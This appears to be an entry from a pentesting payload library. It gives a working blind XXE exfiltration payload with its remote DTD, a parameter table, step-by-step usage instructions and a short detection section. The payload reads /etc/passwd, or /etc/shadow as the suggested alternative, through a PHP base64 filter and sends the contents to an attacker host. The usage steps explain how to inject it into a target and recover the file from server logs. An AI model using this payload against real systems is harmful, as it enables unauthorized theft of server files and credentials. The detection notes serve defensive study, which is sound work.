---
id: 8a358fad-8b60-4f6e-a52f-5acb1054b386
name: Blind-XXE-Exfiltration-XML-Payload-and-DTD
type: code
language: xml
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - xxe
  - payload
  - oob
validated: true
---

# Blind-XXE-Exfiltration-XML-Payload-and-DTD

## Code

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

## Description

This XML code snippet is a malicious payload for blind XXE injection, combined with the content for the remote DTD file. The main payload defines a DOCTYPE that loads an external DTD from the attacker's server, evaluates its parameter entities to read and base64-encode a target file (e.g., /etc/passwd) using the PHP filter, and expands the &exfil; entity to trigger an out-of-band HTTP GET request to the attacker's server with the encoded data in the query parameter. The DTD portion (after the comment) is saved separately as dtd.xml on the attacker server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 127.0.0.1 | Attacker's server IP or domain (replace with public accessible host) | attacker.com |
| /etc/passwd | Path to the target file to exfiltrate | /etc/shadow |

## Usage

1. Save the DTD portion as dtd.xml on your HTTP server.
2. Replace 127.0.0.1 in the main payload with your server address and save as payload.xml.
3. Inject payload.xml into the target application via POST or upload.
4. Monitor your server logs for the exfiltration request containing base64 data, then decode it (e.g., base64 -d) to retrieve the file contents. This is typically used in web pentesting for extracting sensitive server files when direct XXE reflection is blocked.

## Detection

- XML parser logs showing external entity loads or DOCTYPE processing.
- Outbound HTTP requests from the application server to unexpected domains with base64 query parameters.
- WAF alerts on XXE signatures like php://filter or %entity; expansions.
- Network monitoring for DNS resolutions or connections to attacker-controlled IPs.

## Related

- [[procedures/Blind-XXE-Data-Exfiltration-with-DTD-and-PHP-Filter]]
